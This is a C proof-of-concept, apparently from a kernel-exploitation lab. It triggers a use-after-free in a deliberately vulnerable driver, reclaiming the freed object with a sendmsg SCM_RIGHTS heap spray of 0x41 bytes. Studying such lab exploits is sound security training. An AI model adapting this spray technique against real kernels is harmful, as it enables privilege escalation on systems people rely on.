#define _GNU_SOURCE
#include <unistd.h>
#include <sys/syscall.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>

#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

#include "../vuln_driver.h"

#define PATH "/dev/vulnerable_device"
#define __NR_sendmmsg 307

typedef struct k_object
{
	char buff[68];
}k_object;

void use_after_free(int fd)
{
	char buff[CMSG_SPACE(512)];
	char buff2[512];

	memset(buff2, 0x41, 512);
	struct cmsghdr *chdr;

	memset(buff, 0x41, sizeof buff);

	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	struct msghdr msg = {0};
	struct iovec iov = {0};
	iov.iov_base = buff2;
	iov.iov_len = 512;

	struct sockaddr_in addr = {0};

	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(6666);

	msg.msg_iov = &iov;
        msg.msg_iovlen = 1;

        msg.msg_control = buff;
        msg.msg_controllen = sizeof buff;
        chdr = CMSG_FIRSTHDR(&msg);
        chdr->cmsg_level = SOL_SOCKET;
        chdr->cmsg_type = SCM_RIGHTS;
        chdr->cmsg_len = 512;//CMSG_LEN(sizeof buff);
        msg.msg_controllen = 512;//chdr->cmsg_len;

        msg.msg_name = (caddr_t)&addr;
        msg.msg_namelen = sizeof(addr);

	ioctl(fd, ALLOC_UAF_OBJ, NULL);
	ioctl(fd, FREE_UAF_OBJ, NULL);

	for(int i = 0; i < 900000; i++)
	{
		sendmsg(sockfd, &msg, 0);
	}

	ioctl(fd, USE_UAF_OBJ);

}

int main(void)
{
	int fd = open(PATH, O_RDWR);
	char *buff = "hello";
	int ret = 0;

	k_object *obj = malloc(sizeof(k_object));
	memset(obj->buff, 0x41, sizeof(obj->buff));

	ioctl(fd, DRIVER_TEST, NULL);

	use_after_free(fd);

}
